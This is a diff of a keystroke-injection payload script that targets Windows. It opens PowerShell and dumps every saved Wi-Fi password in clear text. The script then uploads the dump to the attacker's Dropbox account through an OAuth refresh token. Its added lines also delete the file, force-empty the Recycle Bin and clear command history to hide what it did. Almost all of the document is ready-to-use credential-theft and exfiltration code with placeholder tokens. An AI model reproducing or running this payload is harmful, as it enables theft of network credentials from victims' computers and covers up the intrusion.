@@ -1,7 +1,8 @@
-# ph3llin's wifi-to-dropbox 
+REM ph3llin's wifi-to-dropbox 
 REM GRABS ALL WIFI PASSWORDS ON WINDOWS CREATES log.txt ON DESKTOP THEN UPLOADS TO YOUR DROPBOX MUST EDIT DROP BOX TOKEN BELOW
+ATTACKMODE HID
 DELAY 2000
-GUI R
+GUI r
 DELAY 200
 STRING cmd
 ENTER
@@ -9,34 +10,46 @@ DELAY 200
 STRING powershell
 ENTER
 DELAY 200
-STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | % {(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize > $env:USERPROFILE\Desktop\log.txt
+STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | % {(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize > $env:USERPROFILE\Desktop\$env:computername.txt
 DELAY 100
 ENTER
 DELAY 100
-STRING $targetPathAndFilename = ' "/log.txt" '
+STRING $targetPathAndFilename =  '"' + "/" + $env:computername + ".txt" + '"'
 ENTER
 STRING $arg = '{ "path": '+$targetpathAndFilename+', "mode": "add", "autorename": true, "mute": false }'
 ENTER
-REM go to "https://www.dropbox.com/developers/apps/create?_tk=pilot_lp&_ad=ctabtn1&_camp=create " create app and get token and put in place of "PUTYOURDROPBOXTOKENHERE" ** keep "Bearer "
-STRING $authorization = "Bearer PUTYOURDROPBOXTOKENHERE"
+REM Insert your refresh_token, app_key and app_secret in the line below
+STRING $refreshToken = "INSERT_REFRESH_TOKEN_HERE"; $grantType = "refresh_token"; $requestUri = "https://api.dropboxapi.com/oauth2/token"; $app_key = "APP_KEY_HERE"; $app_secret = "APP_SECRET_HERE"
+ENTER
+STRING $requestBody = "refresh_token=$refreshToken&client_id=$app_key&client_secret=$app_secret&grant_type=$grantType"
+ENTER
+STRING $response = Invoke-RestMethod -Method Post -Uri $requestUri -ContentType "application/x-www-form-urlencoded" -Body $requestBody
+ENTER
+STRING $authorization = "Bearer " + $response.access_token
 ENTER
 STRING $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
 ENTER
-STRING $headers.Add("Authorization", $authorization)
+STRING $headers.Add("Authorization", $authorization); $headers.Add("Dropbox-API-Arg", $arg); $headers.Add("Content-Type", 'application/octet-stream')
 ENTER
-STRING $headers.Add("Dropbox-API-Arg", $arg)
-ENTER
-STRING $headers.Add("Content-Type", 'application/octet-stream')
-ENTER
-STRING $response = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $env:USERPROFILE\Desktop\log.txt -Headers $headers
+STRING $response = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $env:USERPROFILE\Desktop\$env:computername.txt -Headers $headers
 ENTER
 DELAY 100
 REM bottom code with delete log.txt and exit powershell
-# STRING cd $env:USERPROFILE\Desktop
-# ENTER
-# DELAY 100
-# STRING del log.txt
-# ENTER
-# DELAY 100
-# STRING exit
-# ENTER
+STRING cd $env:USERPROFILE\Desktop
+ENTER
+DELAY 100
+STRING $file = "$env:computername" + ".txt"
+ENTER
+DELAY 100
+STRING del $file
+ENTER
+DELAY 100
+STRING Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+ENTER
+DELAY 500
+ALT F7
+STRING exit
+ENTER
+DELAY 200
+STRING exit
+ENTER
